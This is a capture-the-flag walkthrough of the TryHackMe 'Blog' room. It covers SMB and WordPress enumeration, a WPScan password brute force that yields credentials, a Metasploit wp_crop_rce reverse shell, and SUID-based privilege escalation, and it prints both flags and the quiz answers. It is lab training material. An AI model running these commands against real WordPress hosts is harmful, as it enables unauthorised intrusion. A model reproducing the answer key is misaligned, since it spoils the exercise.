---
description: Billy Joel made a Wordpress blog!
---

# Blog

## **Description**

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

_In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file._

_Credit to_ [_Sq00ky_](https://tryhackme.com/p/Sq00ky) _for the root privesc idea ;)_

The images used in this room have been used with the author's permission or in accordance with [Section 107 of the U.S. Copyright Act](https://www.copyright.gov/title17/92chap1.html#107).

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

### Nmap

```bash
nmap -A -Pn 10.10.89.129
```

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

I found out some smb, let use `enum4linux` Thank ([https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#ipcusd-share](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#ipcusd-share))

### enum4linux

```bash
enum4linux -a 10.10.89.129
```

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>Found BillySMB</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>Found bjoel username</p></figcaption></figure>

### SMBClient

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>Found some picture</p></figcaption></figure>

### Crack the images

```bash
steghide extract -sf Alice-White-Rabbit.jpg
```

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption><p>Rabbit Hole!</p></figcaption></figure>

### Directory Enumeration

```bash
dirsearch -u http://10.10.89.129
```

Go back to the website that I already running **dirsearch.** I found the WordPress login.

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Let try the username that found from **enum4linux**.

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption><p>Bingo!</p></figcaption></figure>

### WPScan

```bash
wpscan --url http://blog.thm --enumerate u
```

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption><p>WordPress version 5.0</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption><p>Found more user kwheel</p></figcaption></figure>

Now, we know the WordPress version. While running the wpscan for brute-force the password. I found some vulnerability that I can reverse shell. [https://www.rapid7.com/db/modules/exploit/multi/http/wp\_crop\_rce/](https://www.rapid7.com/db/modules/exploit/multi/http/wp\_crop\_rce/)

```bash
wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel,bjoel -t 64 
```

* \-t 64: Sets the number of threads to `64`, controlling how many password attempts can be made in parallel

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption><p>kwheel : cutiepie1</p></figcaption></figure>

### Metasploit

```bash
msf > use exploit/multi/http/wp_crop_rce
msf > set RHOST blog.thm
msf > set LHOST <YOUR_IP>
msf > set LPORT <YOUR_PORT>
msf > set USERNAME kwheel
msf > set PASSWORD cutiepie1
msf > run 
```

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Create Shell environment

```bash
SHELL=/bin/bash script -q /dev/null
```

```bash
find / -type f -user root -perm -u=s 2>/dev/null
```

Used to search the entire filesystem (`/`) for files (`-type f`) owned by the user `root` (`-user root`) that have the setuid bit set (`-perm -u=s`), suppressing error messages (`2>/dev/null`)

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Check all file and found interesting thing.

```bash
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
```

```
ltrace checker
```

`ltrace`, it prints a list of all library calls made by the program as they occur.

<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption><p>DONE!</p></figcaption></figure>

## Answer the questions below

### root.txt

```bash
find / -type f -name "root.txt"
```

<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption><p>9a0b2b618bef9bfa7ac28c1353d9f318</p></figcaption></figure>

```
ANS: 9a0b2b618bef9bfa7ac28c1353d9f318
```

### user.txt

```bash
find / -type f -name "user.txt"
```

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption><p>c8421899aae571f7af486492b71a8ab7</p></figcaption></figure>

```
ANS: c8421899aae571f7af486492b71a8ab7
```

### Where was user.txt found?

```bash
ANS: /media/usb/user.txt
```

### What CMS was Billy using?

<pre><code><strong>ANS: wordpress
</strong></code></pre>

### What version of the above CMS was being used?

```
ANS: 5.0
```

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
